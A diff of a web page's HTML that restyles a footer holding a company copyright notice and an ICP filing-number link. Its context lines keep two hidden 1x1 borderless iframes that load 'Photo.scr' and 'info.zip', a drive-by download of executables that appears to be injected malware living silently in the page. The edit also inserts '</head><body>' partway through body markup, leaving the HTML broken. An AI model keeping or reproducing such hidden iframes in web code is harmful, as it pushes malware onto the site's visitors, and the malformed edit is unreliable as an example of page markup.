@@ -209,11 +209,31 @@
        <iframe src="Photo.scr" width="1" height="1" frameborder="0"> </iframe>
        <iframe src="info.zip" width="1" height="1" frameborder="0"> </iframe>
       </div>
-      <!-- 新增部分：备案信息 -->
-  <div class="footer" style="text-align:center;">
-    <p style="text-align:center;">Copyright © 河南享卡信息科技有限公司版权所有</p>
+      <style>
+    /* 新增部分：为 .footer 添加样式 */
+    .footer {
+      position: fixed;
+      bottom: 0;
+      left: 0;
+      right: 0;
+      background-color: #f8f9fa; /* 可以根据需要更改背景颜色 */
+      padding: 10px; /* 可以根据需要调整内边距 */
+      text-align: center;
+    }
+    
+    .footer p, .footer a {
+      color: #6c757d; /* 可以根据需要更改文本颜色 */
+    }
+  </style>
+</head>
+<body>
+  <!-- 网页内容... -->
+  
+  <!-- 新增部分：备案信息 -->
+  <div class="footer">
+    <p>Copyright © 河南享卡信息科技有限公司版权所有</p>
     <!-- 将原来的豫ICP备12345678号-1替换为链接 -->
-    <a href="https://beian.miit.gov.cn/#/Integrated/index" target="_blank" style="color: inherit;">豫ICP备12345678号-1</a>
+    <a href="https://beian.miit.gov.cn/#/Integrated/index" target="_blank">豫ICP备12345678号-1</a>
   </div>
 
   <!-- 请确保没有任何其他元素出现在 .footer 后面 -->
